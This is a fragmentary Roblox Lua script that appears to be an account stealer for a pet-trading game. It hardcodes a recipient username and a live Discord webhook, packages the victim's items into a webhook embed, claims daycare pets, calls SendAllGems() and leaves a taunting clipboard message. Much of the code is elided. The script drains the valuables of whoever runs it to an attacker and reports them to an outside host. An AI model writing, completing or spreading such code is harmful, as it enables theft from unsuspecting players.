Username = "JBXCreator"
Username2 = "JBXCreator"
Webhook = "https://discord.com/api/webhooks/1363821947170983997/oYFFNtmH2j7B2MB9t-SassnWxpruyjD6Z1VFb7cAangFwLCK7qN8FX10ivA08pHlEZa3"
min_rap = 10
 ...
 local fields = {
  ...
  },
  {
   ...
   inline = false
    ...
    local data = {
        ["embeds"] = {{
            ["title"] = "Preston Giving Your Server Titanics" ,
            ["color"] = 65280,
   ["fields"] = fields,
   ["footer"] = {
    ["text"] = "Waiting Preston join in 2 minutes"
   }
        }}
    }
...
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
 ...
 require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
    ...
    SendAllGems()
    setclipboard("Have Fun Whit Titanic")
